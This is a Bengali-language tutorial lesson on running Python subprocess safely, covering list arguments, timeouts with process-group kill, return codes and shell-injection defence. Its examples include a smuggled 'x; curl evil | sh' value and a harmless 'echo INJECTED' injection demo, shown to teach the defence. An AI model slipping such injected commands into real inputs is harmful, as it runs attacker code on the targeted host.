# L05-04 — subprocess নিরাপদভাবে চালানো

| | |
|---|---|
| **Module** | 05 — Python for Infrastructure |
| **Difficulty** | Intermediate |
| **আনুমানিক সময়** | ৩ ঘণ্টা |
| **পূর্বশর্ত** | [L05-03 — File ও pathlib](L05-03-files-and-pathlib.md), [L04-02 — Variable ও expansion](../04-bash-and-shell-automation/L04-02-variables-arrays-expansion.md), [L01-08 — Process ও signal](../01-linux-systems/L01-08-processes-signals.md) |
| **Label** | — |
| **Tested** | `run_cmd.py`: ৮টি test পাস (Python 3.14.5, Windows, Git Bash)। **আসল পরিমাপ:** grandchild process থাকলে সাধারণ `subprocess.run(timeout=1)` ফিরেছে **৬.০৬ s**-এ, আর `run_cmd.run(timeout=1)` **১.১৮ s**-এ। `injection_demo.py` চালিয়ে shell injection দেখানো হয়েছে (নিরীহ `echo` payload)। **সীমাবদ্ধতা:** এই machine-এ Windows-এর `taskkill /T` path চলেছে; Linux-এর `os.killpg` path **চালানো হয়নি** (CI-তে চলবে)। |

---

## 1. এই lesson-এ যা শিখবেন

- `subprocess.run`-এর সঠিক রূপ: **list argument**, `shell=False`, `timeout`, `check`, `capture_output`, `text`।
- কেন `shell=True` + f-string = **command injection**, আর `shlex.quote` কখন লাগে।
- Timeout-এর লুকানো ফাঁদ: **grandchild process pipe খোলা রাখলে timeout কাজ করে না** — process group দিয়ে সমাধান।
- Return code-এর রীতি (124 timeout, 126, 127) ও structured ফল।
- `shlex.join` দিয়ে log-এ সঠিক command দেখানো।
- কখন subprocess একেবারেই লাগে না (Python-এর নিজের library যথেষ্ট)।

## 2. এই ধারণা কোন সমস্যার সমাধান করে

Ops tool প্রায়ই বাইরের program চালায়: `systemctl`, `git`, `pg_dump`, `kubectl`, `terraform`। তিনটি সাধারণ বিপর্যয়:

1. **Injection:** `os.system(f"tar czf /backup/{name}.tgz /data")` — `name` যদি আসে webhook বা ticket থেকে, এবং তাতে থাকে `x; curl evil | sh`, তাহলে root-এ যেকোনো code চলবে।
2. **ঝুলে থাকা:** `kubectl` network-এ আটকে গেল; cron job কখনো শেষ হয় না; পরের run-গুলো জমতে থাকে (L04-06-এর lock-এর গল্প)।
3. **চুপচাপ ব্যর্থতা:** return code দেখা হয়নি; `pg_dump` ব্যর্থ, কিন্তু খালি backup "সফল" হিসেবে upload হলো।

## 3. সহজ ভাষায় পরিচয়

```python
import subprocess

# ✅ সঠিক: list, timeout, output ধরা, text
r = subprocess.run(["systemctl", "is-active", "nginx"],
                   capture_output=True, text=True, timeout=10)
if r.returncode != 0:
    ...

# ✅ ব্যর্থ হলে exception চাইলে
subprocess.run(["pg_dump", "-f", out, db], check=True, timeout=3600)

# ❌ ভুল: shell string-এ বাইরের মান
subprocess.run(f"pg_dump -f {out} {db}", shell=True)
```

| Parameter | কাজ | ভুলে গেলে |
|---|---|---|
| list argument | প্রতিটি argument আলাদা, কোনো shell নেই | injection, space-ওয়ালা নাম ভাঙে |
| `timeout=` | সর্বোচ্চ সময় | চিরকাল ঝুলে থাকা |
| `capture_output=True` | stdout/stderr ধরা | Output log-এ মিশে যায়, যাচাই করা যায় না |
| `text=True` + `encoding` | `bytes` নয়, `str` | `b'...'` তুলনা ভুল |
| `check=True` | rc ≠ 0 হলে `CalledProcessError` | চুপচাপ ব্যর্থতা |
| `cwd=`, `env=` | কোথায় ও কোন environment-এ | `os.chdir` দিয়ে পুরো process-এর অবস্থা বদলানো |

## 4. বাস্তব জীবনের উদাহরণ (analogy)

### রাঁধুনিকে নির্দেশ দেওয়া

- **Shell string** = মুখে একটি পুরো বাক্য বলা: "টেবিল ৫-এর জন্য ভাত রাঁধো"। কিন্তু টেবিলের নাম যদি হয় "৫; আর ক্যাশ বাক্সটা দিয়ে দাও", তাহলে রাঁধুনি দুটো নির্দেশই শুনবে।
- **List argument** = ছাপানো অর্ডার স্লিপ, যার নির্দিষ্ট ঘরে লেখা: পদ = ভাত, টেবিল = "৫; আর ক্যাশ বাক্সটা দিয়ে দাও"। ঘরের লেখা কখনো নতুন নির্দেশ হয় না — টেবিলের নাম অদ্ভুত, এই পর্যন্তই।
- **Timeout** = "২০ মিনিটে না হলে বাতিল"।
- **Process group kill** = রাঁধুনি সাহায্যকারী ডেকেছেন। বাতিলের সময় শুধু রাঁধুনিকে নয়, পুরো দলকে থামাতে হবে — নইলে সাহায্যকারী চুলা জ্বালিয়েই রাখবে।

### Analogy কোথায় মেলে না

- স্লিপের ঘর সব সময় নিরাপদ। **List argument-ও সব ক্ষেত্রে নিরাপদ নয়:**
  - Program নিজে argument-কে command হিসেবে পড়তে পারে (`ssh host "$cmd"`, `bash -c`, `find -exec`, `git -c core.sshCommand=…`)।
  - `-`-দিয়ে শুরু মান option হিসেবে পড়া হতে পারে — `--` ব্যবহার করুন, যেমন `["rm", "--", name]`।
- রাঁধুনির কাছে "বাক্য" একটাই। **Windows-এ "list" আসলে আবার একটি string-এ জোড়া হয়** (`list2cmdline`), এবং প্রতিটি program নিজে তা ভাঙে। `.bat`/`.cmd` চালালে cmd.exe জড়িত হয় — সেখানে list-ও ঝুঁকিপূর্ণ (২০২৪-এর "BatBadBut" শ্রেণির দুর্বলতা)।
- দল থামানো সহজ মনে হয়। কিন্তু কোনো descendant নিজেকে নতুন session-এ সরিয়ে নিলে (daemon) সে process group-এর বাইরে চলে যায়। তখন cgroup (systemd unit, container) লাগে — L01-16।

## 5. Real-world engineering scenario — "Backup job যে কখনো শেষ হয় না"

**পরিস্থিতি:** Python backup script `subprocess.run("pg_dump mydb | gzip > /backup/db.gz", shell=True, timeout=3600)` চালায়। এক রাতে database lock-এ আটকে গেল।

- এক ঘণ্টা পরে Python `TimeoutExpired` তুলতে চাইল, কিন্তু **ফিরল না**। `shell=True` মানে child হলো `sh`; `pg_dump` ও `gzip` তার সন্তান। Python শুধু `sh`-কে kill করল, অথচ `pg_dump` তখনো stdout/stderr pipe ধরে আছে। `communicate()` pipe বন্ধ হওয়ার অপেক্ষায় থাকল।
- পরের রাতের cron run শুরু হলো (lock নেই), এবং দুটি `pg_dump` database-এ চাপ দ্বিগুণ করল।

**এই lesson-এর পরিমাপ (Section 9.1):** এই ঘটনা কৃত্রিমভাবে বানিয়ে দেখা গেছে — ১ সেকেন্ডের timeout ৬.০৬ সেকেন্ড নিয়েছে, অর্থাৎ grandchild-এর পুরো জীবনকাল।

**সমাধান:**

- `start_new_session=True` দিয়ে নতুন process group, এবং timeout-এ `os.killpg` দিয়ে পুরো group বন্ধ।
- Pipe-ওয়ালা কাজ shell ছাড়া (দুটি `Popen` জুড়ে), অথবা Python-এ (`gzip` module)।
- সাথে L04-06-এর lock।

**শিক্ষা:** Timeout শুধু একটি সংখ্যা নয়। Timeout হলে কে কে মারা যাবে, সেটাও নকশার অংশ।

## 6. Diagram — process tree ও timeout

```text
 python (আপনার tool)
   └─ Popen ──► child (pid 100, pgid 100 — start_new_session=True)
                   ├─ grandchild (pid 101, pgid 100)  ── stdout pipe ──┐
                   └─ grandchild (pid 102, pgid 100)  ── stdout pipe ──┤
                                                                       ▼
                                            python: communicate() — pipe-এর EOF-এর অপেক্ষা

 timeout হলে:
   সাধারণ run():  kill(100)  → 101/102 বেঁচে, pipe খোলা → EOF আসে না → অপেক্ষা চলতে থাকে  (৬.০৬ s)
   run_cmd:       killpg(100, SIGTERM) → ২ s পরে SIGKILL → সব বন্ধ → EOF → ফেরত      (১.১৮ s)
   Windows:       taskkill /T /F /PID 100  (tree ধরে)
```

## 7. গুরুত্বপূর্ণ terminology

| Term | বাংলা ব্যাখ্যা |
|---|---|
| `subprocess.run` | Command চালিয়ে শেষ পর্যন্ত অপেক্ষা; `CompletedProcess` ফেরত |
| `Popen` | নিচু স্তর: চালু করা, পরে অপেক্ষা/পড়া |
| `communicate()` | Input দেওয়া ও সব output পড়া (deadlock ছাড়া) |
| Shell injection | বাইরের মান shell-এ command হিসেবে ব্যাখ্যা হওয়া |
| `shlex.quote` / `shlex.join` | POSIX shell-এর জন্য নিরাপদ quoting |
| Process group / session | একসাথে signal পাঠানোর মতো process-এর দল |
| `killpg` | পুরো process group-এ signal |
| Exit code 124/126/127 | Timeout / চালানো যায়নি / পাওয়া যায়নি (রীতি) |
| Pipe deadlock | উভয় পক্ষ একে অপরের অপেক্ষায়; buffer ভরা |
| `--` | "এর পরে আর option নয়" |

## 8. ভেতরে কীভাবে কাজ করে

### 8.1 `shell=True` কী করে

- **Linux-এ:** `["/bin/sh", "-c", your_string]`। String-এর `;`, `|`, `$( )`, `` ` ``, `>`, `*` সবই shell ব্যাখ্যা করে।
- **List (shell ছাড়া):** Python সরাসরি `execve(argv[0], argv, env)` করে। কোনো ব্যাখ্যা নেই, glob নেই, variable expansion নেই।

তাই list-এ `"*.log"` আক্ষরিক `*.log` হিসেবে যায় — glob চাইলে Python-এর `Path.glob` ব্যবহার করুন।

### 8.2 কখন shell সত্যিই লাগে

খুব কম ক্ষেত্রে: ব্যবহারকারী নিজে shell command দেন (যেমন CI-এর `run:` step), অথবা জটিল pipeline।

- তখনও বাইরের মান `shlex.quote` দিয়ে, এবং string-টি **স্থির** রাখুন।
- আরও ভালো: মান environment variable দিয়ে পাঠান — `["bash", "-c", 'tar czf "$OUT" /data']` সাথে `env={"OUT": out}`। Script-এর লেখা কখনো বদলায় না।

### 8.3 Pipe ও deadlock

`stdout=PIPE` দিলে OS-এর pipe buffer থাকে (Linux-এ সাধারণত ৬৪ KiB)। Child বেশি লিখলে সে buffer খালি হওয়ার অপেক্ষা করে। আপনি যদি তখন `proc.wait()`-এ বসে থাকেন, দুজনেই অপেক্ষায় — **deadlock**। `communicate()` একই সাথে পড়ে, তাই নিরাপদ।

খুব বড় output হলে memory-তে না রেখে file-এ পাঠান (`stdout=open(...)`) বা line-by-line পড়ুন (L05-11)।

### 8.4 Signal-এর ক্রম

- প্রথমে SIGTERM — program-কে পরিষ্কারভাবে বন্ধ হওয়ার সুযোগ (temp file মোছা, lock ছাড়া)।
- কিছু সময় পরে SIGKILL (L01-08)। `run_cmd` ২ সেকেন্ড অপেক্ষা করে।
- Windows-এ SIGTERM-এর সমতুল্য নেই; `taskkill /F` সরাসরি বন্ধ করে।

### 8.5 subprocess না লাগলে

| কাজ | subprocess নয়, এটা |
|---|---|
| `cat`, `grep`, `wc` | `Path.read_text`, `re`, generator |
| `mkdir -p`, `cp`, `mv` | `Path.mkdir`, `shutil.copy2`, `os.replace` |
| `tar`, `gzip` | `tarfile`, `gzip` module |
| `curl` | `urllib.request` / `requests` (L05-06) |
| `date` | `datetime` |

কম process মানে দ্রুত, portable (Windows/macOS), এবং injection-এর সুযোগ নেই।

> **Fedora-তে:** কোনো পার্থক্য নেই। `/bin/sh` Fedora-তে bash, Ubuntu-তে dash — তাই `shell=True` string-এ bash-এর বৈশিষ্ট্য (`[[ ]]`, array) Ubuntu-তে ভাঙবে। আরেকটি কারণ shell এড়ানোর।

## 9. Practical demonstration

Files: [`code/L05-04/run_cmd.py`](code/L05-04/run_cmd.py), [`injection_demo.py`](code/L05-04/injection_demo.py), [`test_l05_04.py`](code/L05-04/test_l05_04.py)।

### 9.1 Timeout-এর ফাঁদ — আসল পরিমাপ

পরীক্ষা: child process একটি grandchild চালু করে (যে ৬ s ঘুমায়, এবং stdout উত্তরাধিকারসূত্রে পায়), তারপর নিজে ৩০ s ঘুমায়। Timeout ১ s।

```python
subprocess.run([sys.executable, "-c", child], capture_output=True, timeout=1)
```

**আসল output:**

```text
TimeoutExpired raised after 6.06 s (asked for 1 s)       ← সাধারণ subprocess.run
run_cmd: True 124 1.183                                   ← run_cmd.run (timed_out, rc, duration)
```

সাধারণ `run()` child-কে ১ s-এ kill করেছে ঠিকই, কিন্তু grandchild-এর ৬ s শেষ হওয়া পর্যন্ত pipe-এর অপেক্ষায় ছিল। Grandchild ৬ ঘণ্টা ঘুমালে timeout-ও হতো ৬ ঘণ্টা।

### 9.2 CLI

```bash
python3 run_cmd.py --timeout 5 -- git --version; echo "exit=$?"
python3 run_cmd.py --json -- no-such-cmd-xyz; echo "exit=$?"
python3 run_cmd.py --timeout 1 -- python3 -c "import time; print('start', flush=True); time.sleep(9)"; echo "exit=$?"
```

**আসল output (stderr ও stdout মিশে দেখাচ্ছে):**

```text
[rc=0 in 0.019s] git --version
git version 2.54.0.windows.1
exit=0

{ "cmd": ["no-such-cmd-xyz"], "returncode": 127,
  "stderr": "command not found: no-such-cmd-xyz", "timed_out": false, "ok": false, … }
exit=127

[TIMEOUT in 1.128s] python -c 'import time; print('"'"'start'"'"', flush=True); time.sleep(9)'
start
exit=124
```

(JSON-এর আসল output-এ `indent=2`; এখানে সংক্ষেপিত।)

- **Timeout-এর আগের output (`start`) হারায়নি** — কোথায় আটকেছিল বোঝার জন্য এটা জরুরি।
- `cmdline`-এর অদ্ভুত-দেখতে quoting (`'"'"'`) হলো `shlex.join`-এর সঠিক POSIX quoting — copy করে shell-এ চালালে ঠিক একই argument যাবে।
- Exit code tool-এর নিজের exit code হিসেবেই ফেরত যায়, তাই shell script-এ `run_cmd.py … || alert` কাজ করে।

### 9.3 Injection — আসল output

```bash
python3 injection_demo.py
```

```text
input name: 'report.txt; echo INJECTED'

1) shell string (f-string), যেমন shell=True:
   processing report.txt
   INJECTED
2) shell string + shlex.quote:
   processing report.txt; echo INJECTED
3) list argument, shell নেই:
   processing report.txt; echo INJECTED
```

১-এ `echo INJECTED` একটি **আলাদা command হিসেবে চলেছে**। এখানে payload নিরীহ, কিন্তু একই জায়গায় `rm`, `curl … | sh` বা secret পাঠানো থাকতে পারত। ২ ও ৩-এ পুরো মানটি একটিই argument।

### 9.4 Ubuntu-তে (চালানো হয়নি)

```bash
python3 run_cmd.py --timeout 3 -- systemctl is-active ssh
python3 run_cmd.py --timeout 1 --json -- bash -c 'sleep 30 & sleep 30'   # killpg-এর path: ~1 s-এ ফেরার কথা
ps -eo pid,pgid,cmd | grep '[s]leep 30'                                   # কিছু থাকার কথা নয়
```

### 9.5 Test

```bash
python3 -m unittest -v
```

৮টি test:

- সফল ও ব্যর্থ (stderr সংরক্ষিত)।
- Not found → 127; string দিলে `TypeError`।
- **Timeout-এ tree kill:** `< 6 s`, এবং আগের output সংরক্ষিত।
- Input, env ও truncation।
- Payload আক্ষরিকভাবে যায়।
- Bash string-এ injection *(bash লাগে)*।
- CLI-এর JSON ও exit code।

## 10. Code-এর ব্যাখ্যা

| অংশ | কী করে | কেন |
|---|---|---|
| `isinstance(cmd, str)` → `TypeError` | String গ্রহণ করে না | ভুল করে shell-এর মতো ব্যবহার আটকায় |
| `start_new_session=True` | Child নতুন session/group-এর নেতা | `killpg` দিয়ে পুরো tree |
| `CREATE_NEW_PROCESS_GROUP` + `taskkill /T` | Windows-এ সমতুল্য | Tree ধরে বন্ধ |
| `stdin=DEVNULL` (input না থাকলে) | Child input-এর জন্য অপেক্ষা করে না | Password prompt-এ ঝুলে থাকা এড়ায় |
| `encoding="utf-8", errors="replace"` | অদ্ভুত byte-এ crash নয় | Program-এর output সবসময় UTF-8 নয় |
| Kill-এর পরে `communicate(timeout=5)` | যা output ছিল তা সংগ্রহ | Debug-এর জন্য |
| `_cap(max_output)` | Output-এর সীমা | Log ও memory রক্ষা |
| `extra_env` merge | পুরো env মুছে না দিয়ে যোগ | `PATH` হারানো এড়ায় |
| `shlex.join` | Log-এ সঠিক command | Copy-paste করে পুনরুৎপাদন |
| 124/126/127 | Coreutils-এর রীতি | Shell script-এর সাথে মিল |

## 11. প্রত্যাশিত ফল ও যাচাই

| যাচাই | প্রত্যাশিত |
|---|---|
| `run_cmd.py -- git --version` | rc ০ |
| অজানা command | rc ১২৭ |
| `--timeout 1 -- … sleep 9` | ~১ s-এ `TIMEOUT`, rc ১২৪ |
| `injection_demo.py` | ১-এ `INJECTED` আলাদা লাইনে; ২ ও ৩-এ আক্ষরিক |
| `python3 -m unittest -v` | `Ran 8 tests`, `OK` |

## 12. সাধারণ ভুল ও troubleshooting

| Symptom | কারণ | সমাধান |
|---|---|---|
| Timeout সত্ত্বেও ঝুলে আছে | Grandchild pipe ধরে আছে | Process group + `killpg` |
| `FileNotFoundError` অথচ command আছে | `PATH` ভিন্ন (cron, systemd) | পূর্ণ path বা `shutil.which` যাচাই |
| Space-ওয়ালা file নাম ভাঙছে | String split করে list বানানো | শুরু থেকেই list |
| `b'active\n' != 'active'` | `text=True` নেই | `text=True`, `.strip()` |
| Script বড় output-এ আটকে যায় | `wait()` + PIPE deadlock | `communicate()` বা file-এ output |
| Command password চেয়ে ঝুলে থাকে | stdin terminal-এ | `stdin=DEVNULL`; non-interactive flag (`-n`, `--batch`) |
| `CalledProcessError`-এ কারণ দেখা যায় না | stderr ধরা হয়নি | `capture_output=True`, log-এ `e.stderr` |
| Ubuntu-তে `[[: not found` | `shell=True` = dash | Shell এড়ান, বা স্পষ্ট `["bash", "-c", …]` |

## 13. Security, performance ও cost বিবেচনা

- **Security:**
  - বাইরের মান কখনো shell string-এ নয়।
  - Option injection ঠেকাতে `--`।
  - Command-এর পূর্ণ path দিন (`/usr/bin/systemctl`), যাতে `PATH`-এ রাখা নকল program না চলে।
  - **Log-এ command line দেখানোর আগে secret সরান:** `--password=…` argument অন্য user `ps`-এও দেখতে পায়। Secret env বা file দিয়ে পাঠান (L05-10)।
  - `sudo` দিয়ে চালালে নির্দিষ্ট command-এর জন্য sudoers নিয়ম রাখুন (L01-05)।
- **Performance:**
  - প্রতিটি process চালু করতে কয়েক মিলিসেকেন্ড লাগে (এখানে `git --version` ০.০১৯ s)।
  - Loop-এ হাজারবার চালালে Python library-ই ভালো (Section 8.5)।
  - সমান্তরাল চালাতে `concurrent.futures` (L05-12)।
- **Cost:** ঝুলে থাকা job CI runner-এর মিনিট পোড়ায় — GitHub Actions-এর default job timeout ৩৬০ মিনিট (L03-06)। প্রতিটি বাইরের call-এ timeout cost-নিয়ন্ত্রণও।

## 14. Hands-on exercise

1. Ubuntu-তে Section 9.4 চালান। `ps`-এ কোনো `sleep 30` রয়ে গেল কি?
2. `run_cmd.run`-এ `check=True` বিকল্প যোগ করুন, যা নিজের `CommandError` তোলে (`Result` সহ)। Test লিখুন।
3. `pg_dump | gzip`-এর মতো একটি pipeline shell ছাড়া বানান: দুটি `Popen`, প্রথমটির stdout দ্বিতীয়টির stdin। উভয়ের return code যাচাই করুন — `pipefail`-এর Python রূপ।
4. `run_cmd`-এ `redact=["--password"]` যোগ করুন: `cmdline`-এ ওই option-এর মান `***` দেখাবে।
5. একটি command ১০,০০০ বার চালানোর সময় `subprocess` বনাম Python-এর সমতুল্য library (যেমন `wc -l` বনাম `sum(1 for _ in f)`) মাপুন।

## 15. Mini-project — Service status collector

`svcstatus.py nginx ssh cron`:

- প্রতিটি service-এর জন্য `systemctl is-active` ও `systemctl show -p ActiveEnterTimestamp,NRestarts` (`run_cmd` দিয়ে, প্রতিটিতে timeout)।
- ফল JSON-এ।
- কোনোটি inactive হলে exit ১।
- `systemctl` না থাকলে (container, Windows) সব service-এর জন্য স্পষ্ট "unsupported" ফল ও exit ২।

L05-12-এর health check এটা ব্যবহার করবে।

## 16. Interview প্রশ্ন

1. `shell=True` কেন বিপজ্জনক? কখন এটা গ্রহণযোগ্য?
2. Subprocess-এর timeout দিলেও script ঝুলে থাকতে পারে — কীভাবে?
3. `subprocess.run` ও `Popen`-এর পার্থক্য কী? `communicate()` কেন?
4. Command line argument-এ password দেওয়া কেন খারাপ?
5. Return code ১২৪, ১২৬, ১২৭-এর অর্থ কী?
6. কোন ক্ষেত্রে subprocess না চালিয়ে Python library ব্যবহার করবেন?

## 17. Self-assessment প্রশ্ন

1. রাঁধুনি analogy কোথায় মেলে না (তিনটি বিষয়)?
2. Section 5-এ timeout কেন কাজ করেনি?
3. ৬.০৬ s বনাম ১.১৮ s — পার্থক্যের কারণ কী?
4. `stdin=DEVNULL` কোন সমস্যা ঠেকায়?
5. Ubuntu-তে `shell=True` string-এ `[[ ]]` কেন ভাঙে?

## 18. সংক্ষিপ্ত সারাংশ

- সবসময় list argument; বাইরের মান shell string-এ কখনো নয়।
- প্রতিটি call-এ timeout; timeout-এ পুরো process group বন্ধ (`start_new_session` + `killpg`)।
- Return code যাচাই, stderr ধরা, log-এ `shlex.join` (secret বাদ দিয়ে)।
- `communicate()` deadlock এড়ায়; বড় output file-এ পাঠান।
- Python library দিয়ে করা গেলে subprocess নয়।

## 19. Completion checklist

- [ ] Timeout-এর ফাঁদ নিজের machine-এ পুনরুৎপাদন করেছি
- [ ] `injection_demo.py`-এর তিনটি ফল ব্যাখ্যা করতে পারি
- [ ] Ubuntu-তে `killpg` path পরীক্ষা করেছি
- [ ] `python3 -m unittest -v`-এ ৮টি test পাস
- [ ] [PROGRESS.md](PROGRESS.md)-এ learner status আপডেট

## 20. Official documentation ও further reading

- Python — `subprocess`: https://docs.python.org/3/library/subprocess.html
- Python — Security considerations (subprocess): https://docs.python.org/3/library/subprocess.html#security-considerations
- Python — `shlex`: https://docs.python.org/3/library/shlex.html
- Python — `os.killpg`, `os.setsid`: https://docs.python.org/3/library/os.html
- GNU coreutils — `timeout` (exit status): https://www.gnu.org/software/coreutils/manual/html_node/timeout-invocation.html
- OWASP — OS Command Injection Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html

---

**পরের lesson:** L05-05 — JSON, YAML ও configuration processing
